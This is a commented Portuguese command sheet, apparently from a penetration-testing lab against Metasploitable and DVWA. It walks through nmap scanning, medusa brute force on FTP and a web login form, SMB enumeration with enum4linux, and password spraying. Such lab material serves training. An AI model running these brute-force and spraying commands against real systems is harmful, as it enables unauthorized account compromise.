# ==============================================================================
# 1. RECONHECIMENTO E VARREDURA DE REDE
# ==============================================================================

# Envia 3 pacotes ICMP para verificar se o host alvo está ativo e acessível na rede
ping -c 3 numero.ip

# Escaneia as portas específicas (21=FTP, 22=SSH, 80=HTTP, 139/445=SMB) e detecta as versões dos serviços (-sV)
nmap -sV -p 21,22,80,445,139 numero.ip


# ==============================================================================
# 2. ATAQUE DE FORÇA BRUTA EM FTP (PORTA 21)
# ==============================================================================

# Testa a conexão manual via terminal com o servidor FTP do alvo
ftp numero.ip

# Cria uma wordlist de usuários comuns (o \n quebra a linha para cada usuário)
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

# Cria uma wordlist de senhas fracas para o teste
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

# Executa o ataque Brute Force no serviço FTP (-M ftp) usando 6 threads simultâneas (-t 6)
medusa -h numero.ip -U users.txt -P pass.txt -M ftp -t 6


# ==============================================================================
# 3. ATAQUE DE FORÇA BRUTA EM HTTP / FORMULÁRIO WEB (PORTA 80)
# ==============================================================================

# Realiza Brute Force na página de login do DVWA:
# -m PAGE: caminho da página de login
# -m FORM: estrutura da requisição POST substituindo ^USER^ e ^PASS^ pelas wordlists
# -m FAIL: texto retornado pela página quando o login falha (para o Medusa saber que errou)
medusa -h numero.ip -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6


# ==============================================================================
# 4. ENUMERAÇÃO E PASSWORD SPRAYING EM SMB (PORTAS 139 / 445)
# ==============================================================================

# Enumera usuários, compartilhamentos e políticas do serviço SMB (-a = tudo) e salva a saída em arquivo (tee)
enum4linux -a numero.ip | tee enum4_output.txt

# Cria uma wordlist específica com os usuários identificados na etapa de enumeração SMB
echo -e "user\nmsfadmin\nservice" > smb_users.txt

# Cria uma lista curta de senhas comuns para realizar Password Spraying
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

# Executa o ataque no protocolo SMB (-M smbnt) com 2 threads por host (-t 2) e limite de 50 conexões totais (-T 50)
medusa -h numero.ip -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

# Lista os diretórios compartilhados (-L) no servidor SMB autenticando com a credencial descoberta (-U msfadmin)
smbclient -L //numero.ip -U msfadmin
